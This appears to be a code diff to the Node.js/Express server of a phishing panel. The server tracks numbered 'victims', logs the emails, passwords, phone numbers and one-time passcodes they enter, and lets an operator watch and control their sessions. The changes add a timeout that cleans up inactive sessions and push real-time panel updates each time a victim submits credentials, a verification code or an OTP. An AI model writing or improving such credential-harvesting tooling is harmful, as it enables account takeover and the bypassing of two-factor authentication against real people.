@@ -8,6 +8,7 @@ const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 const COOKIE_NAME    = 'pan_sess_v2';
+const SESSION_TIMEOUT = 3 * 60 * 1000; // 3 minutes in milliseconds
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
@@ -136,6 +137,31 @@ let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
 
+/* ----------  INACTIVE SESSION CLEANUP  ---------- */
+function cleanupInactiveSessions() {
+  const now = Date.now();
+  const toDelete = [];
+  
+  sessionActivity.forEach((lastActivity, sid) => {
+    if (now - lastActivity > SESSION_TIMEOUT) {
+      toDelete.push(sid);
+    }
+  });
+  
+  toDelete.forEach(sid => {
+    const v = sessionsMap.get(sid);
+    if (v) {
+      console.log(`[TIMEOUT] Session ${sid} (Victim #${v.victimNum}) inactive for 3 minutes - deleting`);
+      sessionsMap.delete(sid);
+      sessionActivity.delete(sid);
+      emitPanelUpdate(); // Notify panel of change
+    }
+  });
+}
+
+// Run cleanup every 30 seconds
+setInterval(cleanupInactiveSessions, 30000);
+
 /* ----------  STATIC ROUTES  ---------- */
 app.use(express.static(__dirname));
 
@@ -250,6 +276,7 @@ app.post('/api/session', async (req, res) => {
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
+    emitPanelUpdate();
     res.json({ sid });
   } catch (err) {
     console.error('Session creation error', err);
@@ -280,6 +307,7 @@ app.post('/api/login', async (req, res) => {
     v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
 
     auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('Login error', err);
@@ -301,6 +329,7 @@ app.post('/api/verify', async (req, res) => {
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (e) {
     console.error('Verify error', e);
@@ -319,6 +348,7 @@ app.post('/api/unregister', async (req, res) => {
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });
 
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('Unregister error', err);
@@ -340,6 +370,7 @@ app.post('/api/otp', async (req, res) => {
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
@@ -359,6 +390,7 @@ app.post('/api/page', async (req, res) => {
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
 
+    emitPanelUpdate();
     res.sendStatus(200);
   } catch (err) {
     console.error('Page change error', err);
@@ -369,6 +401,7 @@ app.post('/api/page', async (req, res) => {
 app.get('/api/status/:sid', (req, res) => {
   const v = sessionsMap.get(req.params.sid);
   if (!v) return res.json({ status: 'gone' });
+  sessionActivity.set(req.params.sid, Date.now()); // Update on poll
   res.json({ status: v.status });
 });
 
@@ -392,6 +425,7 @@ app.post('/api/interaction', (req, res) => {
   v.interactions = v.interactions || [];
   v.interactions.push({ type, data, time: Date.now() });
   sessionActivity.set(sid, Date.now());
+  emitPanelUpdate();
   res.sendStatus(200);
 });
 
@@ -479,9 +513,9 @@ app.post('/api/panel', async (req, res) => {
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
-      emitPanelUpdate();
       break;
   }
+  emitPanelUpdate();
   res.json({ ok: true });
 });
 
@@ -497,6 +531,7 @@ app.post('/api/refresh', (req, res) => {
   successfulLogins = 0;
   
   console.log('[DEBUG] Session refreshed by admin');
+  emitPanelUpdate();
   res.json({ ok: true });
 });
 
